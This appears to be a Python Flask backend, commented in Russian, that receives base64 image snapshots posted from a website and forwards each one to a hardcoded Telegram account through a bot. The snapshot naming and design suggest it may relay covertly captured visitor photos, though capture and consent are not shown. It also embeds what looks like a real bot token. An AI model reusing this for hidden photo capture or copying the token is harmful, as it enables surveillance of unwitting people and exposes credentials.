import telebot
from flask import Flask, request, jsonify
from flask_cors import CORS
import base64
import io

# ТВОИ ДАННЫЕ
TOKEN = '8638103577:AAE1Tvw-PXhnVzNHBsqMEJWVV-DCkUBJK0c'
# Сюда впиши свой ID из @userinfobot (просто цифры без кавычек)
MY_ID = 7169470694

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)
CORS(app) # Это чтобы сайт не ругался на безопасность при отправке

@app.route('/upload', methods=['POST'])
def upload():
    try:
        # Получаем данные от сайта
        data = request.json['image']
        header, encoded = data.split(",", 1)
        data_bytes = base64.b64decode(encoded)
        
        # Готовим фото для отправки в ТГ
        photo = io.BytesIO(data_bytes)
        photo.name = 'snapshot.jpg'

        # Отправляем тебе в Телеграм
        bot.send_message(MY_ID, "Фотооооооо чик чик чик")
        bot.send_photo(MY_ID, photo)
        
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        print(f"Ошибка на сервере: {e}")
        return jsonify({"status": "error"}), 500

if __name__ == '__main__':
    import os
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)